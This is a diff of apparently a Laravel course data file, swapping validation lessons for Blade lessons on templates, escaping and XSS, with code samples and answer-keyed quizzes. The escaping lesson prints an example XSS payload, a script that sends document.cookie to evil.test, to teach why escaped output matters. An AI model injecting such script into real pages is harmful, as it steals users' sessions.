-        "<b>Normalising input in the controller instead of `prepareForValidation()`.</b> The rules then run against the raw value, so `unique` misses near-duplicates.",
-        "<b>Using `$request->all()` inside a controller that took a Form Request.</b> You did the work and then threw the result away.",
-        "<b>Reaching for `Validator::make()` for ordinary form data.</b> It gives you an object to handle when `validate()` would have done it for you.",
-        "<b>Sharing one request class between store and update.</b> `unique` needs to ignore the current record on update, which store must not do.",
+        "<b>Querying the database from a template.</b> It cannot be tested without rendering HTML, and inside a loop it silently becomes dozens of queries.",
+        "<b>Using `compact('invoices')` then renaming the local variable.</b> The template loses its data with no error at the point of the change.",
+        "<b>Putting a secret in an HTML comment.</b> It is sent to the browser. Blade comments are not.",
+        "<b>Expecting a stale view to refresh itself.</b> Usually it does, and when it does not, `view:clear` is the answer.",
+        "<b>Forgetting `.blade.php`.</b> A file named `index.php` in the views directory is not compiled by Blade at all.",
       ],
       quiz: [
         {
-          question: "When does a Form Request run its rules?",
+          question: "How do you refer to `resources/views/invoices/index.blade.php`?",
           options: [
-            "When you call `validated()`",
-            "Only in middleware",
-            "After the controller returns",
-            "While Laravel resolves the controller argument, before your method body",
-          ],
-          correctIndex: 3,
-          explanation: "Which is why the method body is only reached on success.",
-        },
-        {
-          question: "What happens when `authorize()` returns false?",
-          options: [
-            "A 403 response",
-            "A validation error",
-            "A redirect to login",
-            "The rules are skipped silently",
+            "`invoices.index`",
+            "`invoices/index`",
+            "`views.invoices.index`",
+            "`index.blade.php`",
           ],
           correctIndex: 0,
-          explanation: "A permission problem is not something the user can fix by editing a field.",
+          explanation: "Slashes in the path become dots in the name.",
         },
         {
-          question: "What is `prepareForValidation()` for?",
+          question: "What does Laravel do with a Blade template?",
           options: [
-            "Running rules twice",
-            "Authorizing the request",
-            "Preparing the response",
-            "Normalising input before the rules run",
+            "Interprets it on every request",
+            "Converts it to JavaScript",
+            "Sends it to the browser as-is",
+            "Compiles it to plain PHP and caches the result",
           ],
           correctIndex: 3,
-          explanation: "So `unique` compares the cleaned value rather than the raw one.",
+          explanation: "Which is why directives cost essentially nothing at runtime.",
         },
         {
-          question: "When is `Validator::make()` the right choice?",
-          options: [
-            "For every form",
-            "When you need better performance",
-            "When validating data that is not the current HTTP request",
-            "Only in tests",
-          ],
-          correctIndex: 2,
-          explanation: "A CSV row during an import, or a payload inside a queued job.",
-        },
-      ],
-    },
-    {
-      id: "showing-errors",
-      title: "Showing errors in Blade",
-      durationMinutes: 10,
-      explanation: "Validation that rejects a form and shows nothing is worse than no validation at all: the user sees the page reload with no explanation.\n\nThe <b>error bag</b> is the `$errors` object available in every view, holding the messages from a failed validation. It is a `MessageBag`, and it is there even when nothing failed, so you can always ask it what went wrong.\n\n---\n\n### 1. Basic — `$errors` is always there\n\nAfter a failed validation, Laravel redirects back and flashes the errors. In every Blade view, `$errors` is available:\n\n```blade\n@if ($errors->any())\n    <div class=\"alert alert-error\">\n        <ul>\n            @foreach ($errors->all() as $error)\n                <li>{{ $error }}</li>\n            @endforeach\n        </ul>\n    </div>\n@endif\n```\n\n`$errors` exists in <b>every</b> view, always, even when nothing failed. It is an empty `MessageBag` in that case, so `$errors->any()` is safe without any check. That is done by a middleware in the `web` group, which is why it works in `web.php` routes and not in `api.php` ones.\n\n---\n\n### 2. Intermediate — per-field errors\n\nA summary at the top is a poor experience on a long form. Put the message next to the field:\n\n```blade\n<label for=\"number\">Invoice number</label>\n\n<input id=\"number\"\n       name=\"number\"\n       value=\"{{ old('number') }}\"\n       class=\"@error('number') border-red-500 @enderror\">\n\n@error('number')\n    <p class=\"text-red-600\">{{ $message }}</p>\n@enderror\n```\n\nTwo things there.\n\n`@error` gives you `$message` inside the block, and the block only renders when that field failed. It also works inline, which is how you highlight the input itself.\n\nAnd `old('number')` refills what the user typed. Validation flashes old input automatically, so this is all that is needed. Without it the user retypes everything, which is the fastest way to make someone abandon a form.\n\nOn an edit form, remember the fallback from Day 6:\n\n```blade\nvalue=\"{{ old('number', $invoice->number) }}\"\n```\n\nUseful methods:\n\n```blade\n$errors->has('number')\n$errors->first('number')\n$errors->get('number')        {{-- all messages for the field --}}\n$errors->count()\n```\n\n---\n\n### 3. Advanced — error bags and API responses\n\nWhen one page has two forms, both post to different routes and both redirect back to the same page. Errors from either would appear on both.\n\n<b>Named error bags</b> separate them:\n\n```php\nreturn back()->withErrors($validator, 'password');\n```\n\n```blade\n@if ($errors->password->any())\n    ...\n@endif\n\n@error('current_password', 'password')\n    <p>{{ $message }}</p>\n@enderror\n```\n\nFrom a Form Request, override the bag name:\n\n```php\nprotected $errorBag = 'password';\n```\n\nWithout this, submitting the password form and failing shows the error under your profile form as well, which looks like a bug in your application.\n\nFor an API you write no Blade at all. Laravel returns the shape for you:\n\n```json\n{\n  \"message\": \"The number field is required.\",\n  \"errors\": {\n    \"number\": [\"The number field is required.\"],\n    \"amount\": [\"The amount field must be a number.\"]\n  }\n}\n```\n\n`errors` maps each field to an <b>array</b> of messages, because a field can fail several rules at once. Client code that reads `errors.number` as a string will break the first time that happens; it should read `errors.number[0]` or join them.\n\nThat plural is also why `bail`, later today, changes the response shape as well as the behaviour.",
-      diagram: `$errors exists in every view, always
-
-  validation fails
-        ↓
-  redirect back, errors + old input flashed
-        ↓
-  $errors available in EVERY Blade view
-  (an empty MessageBag when nothing failed,
-   so ->any() is safe with no guard)
-
-  Provided by a middleware in the \`web\` group.
-  Not present on api.php routes.
-
-
-Summary vs per-field
-
-  @if ($errors->any())          @error('number')
-    list them all at the top      <p>{{ $message }}</p>
-  @endif                        @enderror
-
-  fine for a short form         better on a long one:
-                                the message sits next to
-                                the field that failed
-
-  And always: value="{{ old('number') }}"
-  or the user retypes the whole form.
-
-
-Two forms, one page
-
-  profile form ──┐
-                 ├── both redirect back here
-  password form ─┘
-        ↓
-  without named bags: a password error also appears
-  under the profile form, and looks like a bug
-
-  return back()->withErrors($validator, 'password');
-  @error('current_password', 'password')
-
-
-API shape: errors are ARRAYS
-
-  "errors": { "number": ["required", "too long"] }
-                          └─ a field can fail several rules
-
-  errors.number     → an array, not a string
-  errors.number[0]  → the first message`,
-      codeExample: {
-        title: "Errors in Blade, and named bags",
-        code: `{{-- resources/views/invoices/create.blade.php --}}
-
-<x-layout title="New invoice">
-
-    {{-- A summary. Fine for a short form. --}}
-    @if ($errors->any())
-        <div class="alert alert-error">
-            <ul>
-                @foreach ($errors->all() as $error)
-                    <li>{{ $error }}</li>
-                @endforeach
-            </ul>
-        </div>
-    @endif
-
-    <form method="POST" action="{{ route('invoices.store') }}">
-        @csrf
-
-        <label for="number">Invoice number</label>
-        <input id="number"
-               name="number"
-               {{-- old() refills what they typed; validation flashes it --}}
-               value="{{ old('number') }}"
-               {{-- @error works inline, to highlight the field itself --}}
-               class="input @error('number') border-red-500 @enderror">
-
-        @error('number')
-            <p class="text-red-600">{{ $message }}</p>
-        @enderror
-
-
-        <label for="amount">Amount</label>
-        <input id="amount"
-               name="amount"
-               value="{{ old('amount') }}"
-               class="input @error('amount') border-red-500 @enderror">
-
-        @error('amount')
-            <p class="text-red-600">{{ $message }}</p>
-        @enderror
-
-        <button type="submit">Create invoice</button>
-    </form>
-
-
-    {{-- On an EDIT form, fall back to the model's value --}}
-    {{-- value="{{ old('number', $invoice->number) }}" --}}
-
-
-    {{-- ---------- Two forms on one page ---------- --}}
-    {{-- Without a named bag, a password error shows under the
-         profile form too, and looks like a bug. --}}
-
-    <form method="POST" action="{{ route('profile.update') }}">
-        @csrf @method('PATCH')
-        <input name="name" value="{{ old('name', $user->name) }}">
-        @error('name')<p>{{ $message }}</p>@enderror
-    </form>
-
-    <form method="POST" action="{{ route('password.update') }}">
-        @csrf @method('PUT')
-        <input type="password" name="current_password">
-        {{-- second argument: the bag name --}}
-        @error('current_password', 'password')<p>{{ $message }}</p>@enderror
-    </form>
-
-</x-layout>
-?>
-
-<?php
-// ---------- Naming the bag ----------
-
-// From a controller:
-return back()->withErrors($validator, 'password')->withInput();
-
-// From a Form Request:
-class UpdatePasswordRequest extends FormRequest
-{
-    protected $errorBag = 'password';
-}
-
-// ---------- Useful on $errors ----------
-// $errors->any()               anything failed?
-// $errors->has('number')       did this field fail?
-// $errors->first('number')     its first message
-// $errors->get('number')       ALL its messages
-// $errors->count()`,
-      },
-      keyTakeaways: [
-        "<b>`$errors` is available in every Blade view</b>, always, as an empty bag when nothing failed.",
-        "It is provided by a `web` group middleware, so it exists on browser routes and not on `api.php` ones.",
-        "<b>`@error('field')`</b> renders only when that field failed and gives you `$message`.",
-        "`@error` works inline too, which is how you add an error class to the input itself.",
-        "<b>`old('field')`</b> refills what the user typed; validation flashes it automatically.",
-        "On edit forms use `old('field', $model->field)` so the form is populated before any submit.",
-        "<b>Named error bags</b> keep two forms on one page from showing each other's errors.",
-        "In JSON, <b>each field maps to an array</b> of messages, so client code must not treat it as a string.",
-      ],
-      commonMistakes: [
-        "<b>Validating without displaying anything.</b> The page reloads with no explanation, which is worse than no validation.",
-        "<b>Forgetting `old()`.</b> The user retypes the entire form after one mistake, and usually gives up instead.",
-        "<b>Guarding `$errors` with `isset()`.</b> It is always defined; `$errors->any()` is enough.",
-        "<b>Expecting `$errors` on an `api.php` route.</b> The middleware that shares it is in the `web` group.",
-        "<b>Two forms on one page without named bags.</b> Failing one shows errors under both, and looks like a bug in your app.",
-        "<b>Reading `errors.email` as a string in JavaScript.</b> It is an array, and breaks the moment a field fails two rules.",
-      ],
-      quiz: [
-        {
-          question: "When is `$errors` available in a Blade view?",
-          options: [
-            "Only after a failed validation",
-            "Only on POST requests",
-            "Only inside `@error`",
-            "Always, as an empty bag when nothing failed",
-          ],
-          correctIndex: 3,
-          explanation: "Which is why `$errors->any()` needs no `isset()` guard.",
-        },
-        {
-          question: "What does `@error('number')` give you inside the block?",
-          options: [
-            "`$errors`",
-            "`$field`",
-            "`$message`",
-            "`$old`",
-          ],
-          correctIndex: 2,
-          explanation: "And the block only renders when that field actually failed.",
-        },
-        {
-          question: "Why do you need `old()` on a form input?",
-          options: [
-            "For validation to work",
-            "To set a placeholder",
-            "So the user does not retype everything after one mistake",
-            "It is required by CSRF",
-          ],
-          correctIndex: 2,
-          explanation: "Validation flashes the old input for you; `old()` reads it back.",
-        },
-        {
-          question: "Why are named error bags useful?",
-          options: [
-            "They are faster",
-            "They stop two forms on one page showing each other's errors",
-            "They validate more strictly",
-            "They enable JSON responses",
-          ],
-          correctIndex: 1,
-          explanation: "Otherwise failing the password form shows an error under the profile form.",
-        },
-      ],
-    },
-    {
-      id: "conditional-rules",
-      title: "Conditional rules and Rule objects",
-      durationMinutes: 12,
-      explanation: "Real forms are not uniform. A field can be required only sometimes, or forbidden depending on another field.\n\nA <b>conditional rule</b> is a rule that applies only when some other condition holds. A <b>Rule object</b> is a rule written as a small class or fluent builder instead of a string, for the cases where a string cannot carry enough.\n\n---\n\n### 1. Basic — validating only when present\n\n<b>`sometimes`</b> means: if this field was sent, validate it; if not, say nothing.\n\n```php\n'notes' => ['sometimes', 'string', 'max:1000'],\n```\n\nThe distinction from `nullable` matters and is easy to blur:\n\n```text\nnullable    the field may arrive as null\nsometimes   the field may not arrive at all\n```\n\n`sometimes` is what makes `PATCH` work. A partial update sends only the fields being changed, and every rule you wrote should apply to what <i>was</i> sent while ignoring what was not:\n\n```php\npublic function rules(): array\n{\n    return [\n        'number' => ['sometimes', 'required', 'string', 'max:20'],\n        'amount' => ['sometimes', 'required', 'numeric', 'min:0'],\n    ];\n}\n```\n\n`sometimes` plus `required` reads oddly and is exactly right: <i>if you send it, it must not be empty.</i>\n\n---\n\n### 2. Intermediate — rules that depend on other fields\n\n```php\n'company_name' => ['required_if:client_type,company'],\n'vat_number'   => ['required_with:company_name'],\n'discount'     => ['prohibited_if:client_type,individual'],\n```\n\n```text\nrequired_if:other,value      required when that field equals value\nrequired_unless:other,value  required unless it equals value\nrequired_with:a,b            required when any of those are present\nrequired_with_all:a,b        required when all of them are present\nrequired_without:a           required when that one is absent\nprohibited_if:other,value    must NOT be present in that case\n```\n\n`prohibited_if` and `prohibited_unless` are underused and genuinely valuable. They stop a field being submitted at all in a state where it should not apply, which is more precise than accepting it and ignoring it later. Ignoring it silently is how a discount ends up applied to an account that should never have had one.\n\n---\n\n### 3. Advanced — Rule objects\n\nString rules run out of road once a rule needs a variable, a comma, or a query.\n\n```php\nuse Illuminate\\Validation\\Rule;\n\n'status' => ['required', Rule::in(['draft', 'sent', 'paid'])],\n```\n\nWhich looks like more typing until the list is dynamic:\n\n```php\n'status' => ['required', Rule::in($this->allowedStatusesForUser())],\n```\n\nThe one you will genuinely need is <b>`Rule::unique()->ignore()`</b>. Consider editing an invoice without changing its number:\n\n```php\n'number' => ['required', 'unique:invoices,number'],\n```\n\nThat fails. The number already exists, in the very record being edited. The user is told their own invoice number is taken.\n\n```php\n'number' => [\n    'required',\n    Rule::unique('invoices', 'number')->ignore($this->route('invoice')),\n],\n```\n\nNow the check skips the current row. This is the single most common validation bug in Laravel applications, and it is why store and update usually need <b>separate Form Request classes</b>: the store rules must not ignore anything.\n\nMore `Rule` helpers:\n\n```php\nRule::unique('invoices')->where(fn ($q) => $q->where('client_id', $clientId)),\nRule::exists('clients', 'id')->where('account_id', auth()->user()->account_id),\nRule::requiredIf(fn () => auth()->user()->isAdmin()),\nRule::when($condition, ['required'], ['nullable']),\n```\n\nThat `Rule::exists(...)->where(...)` deserves attention. Plain `exists:clients,id` proves the client exists <i>somewhere</i>, not that it belongs to the person submitting. Scoping it to the account is what stops one customer attaching an invoice to another customer's client, which is a data-leak class of bug that plain `exists` will not catch.",
-      diagram: `nullable vs sometimes
-
-  nullable    the field may arrive as NULL
-  sometimes   the field may NOT ARRIVE AT ALL
-
-  PATCH sends only what changed, so update rules want:
-
-    'amount' => ['sometimes', 'required', 'numeric']
-                     │           │
-                     │           └─ if sent, must not be empty
-                     └─ but it need not be sent
-
-
-The bug almost every Laravel app has had
-
-  Editing invoice INV-001 without changing its number:
-
-  'number' => ['required', 'unique:invoices,number']
-                                  ↓
-        the number exists ... in the row being edited
-                                  ↓
-        "The number has already been taken."
-        The user is told their OWN number is taken.
-
-  Rule::unique('invoices', 'number')->ignore($this->route('invoice'))
-                                  ↓
-                  skips the current row  ✓
-
-  This is why store and update need SEPARATE request classes.
-
-
-exists proves it exists SOMEWHERE
-
-  'client_id' => ['exists:clients,id']
-        client 42 is real ✓ ... but whose client is it?
-
-  Rule::exists('clients', 'id')->where('account_id', $accountId)
-        real AND yours ✓
-
-  Plain exists will not catch one customer attaching an
-  invoice to another customer's client.`,
-      codeExample: {
-        title: "Conditional rules, and store vs update",
-        code: `<?php
-
-namespace App\\Http\\Requests;
-
-use Illuminate\\Foundation\\Http\\FormRequest;
-use Illuminate\\Validation\\Rule;
-
-// ---------- STORE: nothing to ignore ----------
-class StoreInvoiceRequest extends FormRequest
-{
-    public function rules(): array
-    {
-        return [
-            'number' => [
-                'required',
-                'string',
-                Rule::unique('invoices', 'number'),
-            ],
-
-            // Real AND belonging to this account. Plain exists:clients,id
-            // would let someone attach an invoice to another account's client.
-            'client_id' => [
-                'required',
-                Rule::exists('clients', 'id')
-                    ->where('account_id', $this->user()->account_id),
-            ],
-
-            'status' => ['required', Rule::in(['draft', 'sent', 'paid'])],
-
-            // Conditional on other fields
-            'company_name' => ['required_if:client_type,company', 'max:100'],
-            'vat_number'   => ['required_with:company_name', 'max:30'],
-            'discount'     => ['prohibited_if:client_type,individual', 'numeric'],
-
-            'notes' => ['sometimes', 'nullable', 'string', 'max:1000'],
-        ];
-    }
-}
-
-
-// ---------- UPDATE: must ignore the current row ----------
-class UpdateInvoiceRequest extends FormRequest
-{
-    public function rules(): array
-    {
-        return [
-            // Without ->ignore(), saving an unchanged invoice tells the
-            // user their own invoice number is already taken.
-            'number' => [
-                'sometimes',
-                'required',
-                'string',
-                Rule::unique('invoices', 'number')->ignore($this->route('invoice')),
-            ],
-
-            // sometimes + required: if you send it, it must not be empty,
-            // but a PATCH need not send it at all.
-            'amount' => ['sometimes', 'required', 'numeric', 'min:0'],
-            'status' => ['sometimes', 'required', Rule::in(['draft', 'sent', 'paid'])],
-        ];
-    }
-}
-
-
-// ---------- More Rule helpers ----------
-
-// Unique within a scope, rather than globally
-Rule::unique('invoices', 'number')->where(fn ($q) => $q->where('client_id', $id));
-
-// Required only when a condition holds
-Rule::requiredIf(fn () => $this->user()->isAdmin());
-
-// Pick a rule set at runtime
-Rule::when($isDraft, ['nullable'], ['required']);
-
-// Dynamic list, which is where Rule::in beats the string form
-Rule::in($this->allowedStatusesForUser());`,
-      },
-      keyTakeaways: [
-        "<b>`nullable`</b> means the value may be null; <b>`sometimes`</b> means the field may be absent entirely.",
-        "`['sometimes', 'required', ...]` is the correct shape for a `PATCH`: if sent, it must not be empty.",
-        "`required_if`, `required_with`, `required_unless` make a field conditional on another.",
-        "<b>`prohibited_if`</b> rejects a field outright rather than accepting and ignoring it.",
-        "<b>`Rule::in([...])`</b> beats the string form when the allowed list is built at runtime.",
-        "<b>`Rule::unique()->ignore($id)`</b> is essential on update, or saving unchanged data reports the record's own value as taken.",
-        "That is why <b>store and update usually need separate Form Request classes</b>.",
-        "<b>`Rule::exists()->where(...)`</b> proves a record is real <i>and</i> yours; plain `exists` only proves it is real.",
-      ],
-      commonMistakes: [
-        "<b>Using plain `unique` on an update.</b> The record's own value counts as a duplicate, so the user is told their own invoice number is taken.",
-        "<b>Sharing one request class between store and update.</b> Store must not ignore a row, and update must.",
-        "<b>Confusing `nullable` and `sometimes`.</b> A PATCH with `required` and no `sometimes` rejects every field the client did not send.",
-        "<b>Using plain `exists` for a foreign key in a multi-tenant app.</b> It proves the id exists, not that it belongs to this account.",
-        "<b>Accepting a field that should not apply and ignoring it later.</b> `prohibited_if` rejects it up front, where the intent is visible.",
-        "<b>Building a comma-separated `in:` string by hand.</b> A value containing a comma silently becomes two options.",
-      ],
-      quiz: [
-        {
-          question: "What is the difference between `nullable` and `sometimes`?",
-          options: [
-            "None",
-            "`nullable` allows a null value; `sometimes` allows the field to be absent",
-            "`sometimes` is for files",
-            "`nullable` only works on strings",
-          ],
-          correctIndex: 1,
-          explanation: "A PATCH needs `sometimes`, because it sends only the changed fields.",
-        },
-        {
-          question: "Why does plain `unique` break an update form?",
-          options: [
-            "It is too slow",
-            "It only works on new records",
-            "It needs an index",
-            "The record's own value counts as a duplicate",
-          ],
-          correctIndex: 3,
-          explanation: "The user is told their own invoice number is already taken.",
-        },
-        {
-          question: "What fixes that?",
-          options: [
-            "`Rule::unique(...)->ignore($id)`",
-            "`sometimes`",
-            "`nullable`",
-            "`bail`",
-          ],
-          correctIndex: 0,
-          explanation: "It excludes the current row from the uniqueness check.",
-        },
-        {
-          question: "Why use `Rule::exists()->where('account_id', ...)` instead of plain `exists`?",
+          question: "Why prefer an array over `compact()` when passing data?",
           options: [
             "It is faster",
-            "Plain `exists` is deprecated",
-            "Plain `exists` proves the record is real, not that it belongs to this account",
-            "It allows null",
+            "`compact()` is deprecated",
+            "`compact()` depends on the local variable name, so renaming it silently breaks the view",
+            "Arrays allow more data",
           ],
           correctIndex: 2,
-          explanation: "Otherwise one customer can attach an invoice to another customer's client.",
+          explanation: "The failure appears in the template, far from the rename that caused it.",
+        },
+        {
+          question: "Which of these belongs in a controller rather than a template?",
+          options: [
+            "Running the query that fetches the invoices",
+            "Choosing a CSS class from a status",
+            "Looping over invoices",
+            "Formatting a date",
+          ],
+          correctIndex: 0,
+          explanation: "A template may read data and decide how to show it, not fetch it.",
         },
       ],
     },
     {
-      id: "arrays-and-custom-rules",
-      title: "Arrays, custom rules and messages",
-      durationMinutes: 12,
-      explanation: "The last group: validating structured data, writing your own rules, and controlling what the user reads.\n\nA <b>wildcard</b> is a `*` in a field path, applying one rule to every item of an array. A <b>custom rule</b> is your own class implementing `ValidationRule`, for a check Laravel does not ship.\n\n---\n\n### 1. Basic — arrays and wildcards\n\nAn invoice has line items, so the request contains an array of objects:\n\n```json\n{\n  \"lines\": [\n    { \"description\": \"Design\", \"quantity\": 2, \"unit_price\": 250 },\n    { \"description\": \"Hosting\", \"quantity\": 1, \"unit_price\": 50 }\n  ]\n}\n```\n\nThe `*` wildcard means \"every item\":\n\n```php\n'lines'                => ['required', 'array', 'min:1'],\n'lines.*.description'  => ['required', 'string', 'max:200'],\n'lines.*.quantity'     => ['required', 'integer', 'min:1'],\n'lines.*.unit_price'   => ['required', 'numeric', 'min:0'],\n```\n\n```text\nlines\n ├── [0] description ✓  quantity ✓  unit_price ✓\n └── [1] description ✓  quantity ✓  unit_price ✓\n```\n\nValidate the array itself as well as its items. `'array'` alone accepts an empty one, so add `min:1` when at least one line is required. And add a `max` too: without it, someone can post fifty thousand lines and your loop will dutifully process all of them.\n\nSimple nesting uses dots:\n\n```php\n'client'       => ['required', 'array'],\n'client.name'  => ['required', 'string'],\n'client.email' => ['required', 'email'],\n```\n\n---\n\n### 2. Intermediate — messages the user can act on\n\nLaravel's defaults are serviceable and often not what you want a customer to read.\n\n```php\npublic function messages(): array\n{\n    return [\n        'number.required' => 'Every invoice needs a number.',\n        'number.unique'   => 'That invoice number is already in use.',\n        'lines.min'       => 'Add at least one line item.',\n        'lines.*.quantity.min' => 'Quantities must be at least 1.',\n    ];\n}\n```\n\nThe key is `field.rule`. Wildcards work there too.\n\nWhen only the field <i>name</i> reads badly, rename it rather than rewriting every message:\n\n```php\npublic function attributes(): array\n{\n    return [\n        'client_id'          => 'client',\n        'lines.*.unit_price' => 'unit price',\n    ];\n}\n```\n\n\"The client_id field is required\" becomes \"The client field is required\", and every message for that field improves at once.\n\nPlaceholders work in your own messages:\n\n```php\n'amount.min' => 'The :attribute must be at least :min.',\n```\n\nFor messages that need translating rather than customising, the real answer is `lang/en/validation.php`, which holds the defaults and can be published per locale.\n\n---\n\n### 3. Advanced — your own rules, and `bail`\n\nA closure handles a one-off:\n\n```php\n'number' => [\n    'required',\n    function (string $attribute, mixed $value, Closure $fail) {\n        if (! str_starts_with($value, 'INV-')) {\n            $fail('The :attribute must start with INV-.');\n        }\n    },\n],\n```\n\nYou call `$fail` to reject. Returning a value does nothing.\n\nFor anything reused, make a class:\n\n```bash\nphp artisan make:rule ValidInvoiceNumber\n```\n\n```php\nclass ValidInvoiceNumber implements ValidationRule\n{\n    public function validate(string $attribute, mixed $value, Closure $fail): void\n    {\n        if (! preg_match('/^INV-\\d{3}$/', $value)) {\n            $fail('The :attribute must look like INV-001.');\n        }\n    }\n}\n```\n\n```php\n'number' => ['required', new ValidInvoiceNumber],\n```\n\nWhen a check spans several fields, `after()` runs once the normal rules have passed:\n\n```php\npublic function after(): array\n{\n    return [\n        function (Validator $validator) {\n            if ($this->input('paid_at') && ! $this->input('payment_method')) {\n                $validator->errors()->add('payment_method', 'Required when a payment date is set.');\n            }\n        },\n    ];\n}\n```\n\nFinally, <b>`bail`</b> stops checking a field after its first failure:\n\n```php\n'number' => ['bail', 'required', 'string', 'unique:invoices,number'],\n```\n\nThis is not only about tidier messages. Without `bail`, a missing `number` still runs the `unique` rule, which means <b>a database query for a value you already know is invalid</b>. On a form with several database rules, `bail` is the difference between one query and several on every failed submission.\n\nThere is a related default worth knowing: Laravel stops validating a field after `required` fails anyway, but not after other rules. `bail` makes the behaviour explicit for the whole chain.",
-      diagram: `Wildcards validate every item
+      id: "echoing-and-escaping",
+      title: "Echoing data, escaping and XSS",
+      durationMinutes: 10,
+      explanation: "The most common thing you write in Blade is also the most security-relevant.\n\n<b>Escaping</b> means converting characters like `<` and `>` so the browser shows them as text instead of running them as markup. <b>XSS</b> (cross-site scripting) is what escaping prevents: someone getting their own JavaScript to run on your page by hiding it in data your template prints.\n\n---\n\n### 1. Basic — the two ways to print\n\n```blade\n{{ $name }}      {{-- escaped --}}\n{!! $html !!}    {{-- raw --}}\n```\n\n`{{ }}` runs the value through `htmlspecialchars` before printing. So if `$name` holds:\n\n```php\n$name = '<strong>Acme</strong>';\n```\n\nthen `{{ $name }}` displays the literal text `<strong>Acme</strong>` on the page, tags and all, rather than bold text.\n\n`{!! !!}` prints it untouched, so the browser treats it as real HTML.\n\n```text\n{{ $html }}     →  &lt;strong&gt;Acme&lt;/strong&gt;   text on the page\n{!! $html !!}   →  <strong>Acme</strong>             actual markup\n```\n\n---\n\n### 2. Intermediate — why escaping is the default\n\nImagine a client name field. Someone enters:\n\n```text\n<script>fetch('https://evil.test?c='+document.cookie)</script>\n```\n\nYou save it and later display it on the invoice page.\n\nWith `{{ }}`, the visitor sees that text printed on screen. Odd-looking, harmless.\n\nWith `{!! !!}`, the browser executes it. Every user who opens that invoice sends their session cookie to someone else's server. That is <b>XSS</b> (cross-site scripting: injecting code into a page other people view), and it is the mistake `{{ }}` exists to prevent.\n\nThe rule is short:\n\n```text\nUse {{ }} always.\nUse {!! !!} only for HTML you generated yourself.\nNever use {!! !!} on anything a user typed.\n```\n\n\"Anything a user typed\" includes more than it seems: names, invoice descriptions, notes, filenames, data imported from a CSV, values from a third-party API. If it did not come from your own code, it is untrusted.\n\nWhen you genuinely need user-supplied rich text, sanitise it through a purifier library first, then print the cleaned result. Sanitise on the way in or at render time, but never simply trust it.\n\n---\n\n### 3. Advanced — escaping is context-sensitive\n\n`{{ }}` escapes for <b>HTML</b>. That is the right thing between tags and inside attributes, but not everywhere.\n\nInside a `<script>` block, HTML escaping is the wrong tool:\n\n```blade\n{{-- Wrong --}}\n<script>\n    const client = \"{{ $client }}\";\n</script>\n```\n\nA name containing a quote or a backslash breaks your JavaScript, and a carefully chosen value can escape the string entirely.\n\nUse `@json`, which encodes for JavaScript:\n\n```blade\n<script>\n    const client = @json($client);\n    const invoice = @json($invoice);\n</script>\n```\n\nIt handles quotes, arrays and objects correctly, and no surrounding quotes are needed.\n\nOne more piece of syntax. If you use a front-end framework that also writes `{{ }}`, prefix it with `@` so Blade leaves it alone:\n\n```blade\n@{{ message }}      {{-- Blade prints: {{ message }} --}}\n```\n\nFor a whole block, `@verbatim`:\n\n```blade\n@verbatim\n    <div id=\"app\">{{ message }}</div>\n@endverbatim\n```\n\nAnd two small conveniences:\n\n```blade\n{{ $invoice['note'] ?? 'No note' }}    {{-- plain PHP null coalescing --}}\n```\n\nBlade also supports `{{ $x or 'default' }}` in some older material; `??` is the current form and the one to use.",
+      diagram: `The two echoes
 
-  'lines'               => ['required', 'array', 'min:1', 'max:100']
-  'lines.*.description' => ['required', 'string']
-  'lines.*.quantity'    => ['required', 'integer', 'min:1']
+  $name = '<script>steal()</script>'
 
-  lines
-   ├── [0] description ✓ quantity ✓
-   └── [1] description ✓ quantity ✓
+  {{ $name }}       →  printed as text on the page      harmless
+  {!! $name !!}     →  the browser RUNS it              XSS
 
-  Validate the ARRAY too, not just the items:
-    'array'   alone accepts an empty one
-    'min:1'   at least one line
-    'max:100' or someone posts 50,000 and your loop runs them all
+  {{ }} escapes for HTML. That is why it is the default.
 
 
-Messages: key is field.rule
+What counts as untrusted
 
-  'number.required' => 'Every invoice needs a number.'
-  'lines.*.quantity.min' => 'Quantities must be at least 1.'
+  typed by a user        an invoice note, a client name
+  imported               a CSV column, a spreadsheet
+  from an API            a third party's field
+  a filename             uploaded by anyone
 
-  Only the NAME reads badly? Rename it once instead:
-    attributes(): ['client_id' => 'client']
-    → every message for that field improves at once
+  If it did not come from your own code, use {{ }}.
 
 
-bail is about queries, not just tidiness
+Escaping is CONTEXT-sensitive
 
-  WITHOUT bail                    WITH bail
-  required  ✗ fails               required  ✗ fails
-  string    → still checked            ↓
-  unique    → DATABASE QUERY        STOP
-                for a value you
-                already know is bad
+  Between tags        {{ $client }}       ✓ HTML escaping
+  In an attribute     "{{ $client }}"     ✓ HTML escaping
+  Inside <script>     "{{ $client }}"     ✗ WRONG TOOL
+                      @json($client)      ✓ encoded for JavaScript
 
-  On a form with several database rules, that is
-  several wasted queries on every failed submit.`,
+  A name with a quote breaks the JS; a crafted one escapes the string.
+
+
+Leaving {{ }} for a JS framework
+
+  @{{ message }}          one expression
+  @verbatim ... @endverbatim   a whole block`,
       codeExample: {
-        title: "Arrays, custom rules, messages and bail",
-        code: `<?php
+        title: "Escaped, raw, and JavaScript",
+        code: `{{-- resources/views/invoices/show.blade.php --}}
 
-namespace App\\Http\\Requests;
+{{-- ---------- The default: always escaped ---------- --}}
+<h1>{{ $invoice['client'] }}</h1>
+<p>{{ $invoice['note'] ?? 'No note' }}</p>
 
-use App\\Rules\\ValidInvoiceNumber;
-use Closure;
-use Illuminate\\Foundation\\Http\\FormRequest;
-use Illuminate\\Validation\\Validator;
+{{-- Safe in attributes too --}}
+<a href="{{ route('invoices.show', $invoice['number']) }}"
+   title="{{ $invoice['client'] }}">View</a>
 
-class StoreInvoiceRequest extends FormRequest
+
+{{-- ---------- Raw: only for HTML YOU generated ---------- --}}
+{{-- Fine: this string is built by your own code. --}}
+{!! $renderedInvoiceTable !!}
+
+{{-- NEVER. If a client name is
+     <script>fetch('https://evil.test?c='+document.cookie)</script>
+     then every visitor to this page sends their session cookie away. --}}
+{!! $invoice['client'] !!}
+
+
+{{-- ---------- Passing data to JavaScript ---------- --}}
+
+{{-- Wrong: {{ }} escapes for HTML, not for JS. A quote or a
+     backslash in the name breaks the script or escapes the string. --}}
+<script>
+    const client = "{{ $invoice['client'] }}";
+</script>
+
+{{-- Right: @json encodes for JavaScript, quotes included. --}}
+<script>
+    const client  = @json($invoice['client']);
+    const invoice = @json($invoice);
+    const lines   = @json($invoice['lines']);
+</script>
+
+
+{{-- ---------- Leaving {{ }} alone for a JS framework ---------- --}}
+<div id="app">
+    @{{ message }}
+</div>
+
+@verbatim
+    <div id="vue-app">
+        {{ message }}
+        {{ count }}
+    </div>
+@endverbatim
+
+
